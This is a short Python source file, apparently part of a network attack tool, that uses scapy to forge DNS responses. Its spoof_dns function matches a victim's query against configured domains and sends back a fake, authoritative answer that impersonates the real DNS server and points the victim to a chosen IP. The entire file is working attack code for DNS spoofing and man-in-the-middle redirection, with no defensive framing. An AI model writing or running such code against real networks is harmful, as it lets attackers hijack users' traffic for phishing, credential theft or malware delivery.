from scapy.all import *
from config import config

def spoof_dns(pkt, interface):
	victim_mac = pkt[Ether].src
	victim_ip = pkt[IP].src
	dns_server_ip = pkt[IP].dst
	qname = pkt[DNSQR].qname
	
	for domain, fake_ip in config.dns.domains:
		if domain.encode() in qname:
			ether = Ether(dst = victim_mac)
			ip = IP(src=dns_server_ip, dst=victim_ip)
			udp = UDP(sport=53, dport=pkt[UDP].sport)
			dns = DNS(id=pkt[DNS].id, qr=1, aa=1, rd=pkt[DNS].rd, ra=1, qd=pkt[DNS].qd, an=DNSRR(rrname=qname, ttl=60, rdata=fake_ip))
			
			spoof = ether/ip/udp/dns
			sendp(spoof, iface=interface)
			return True
	return False

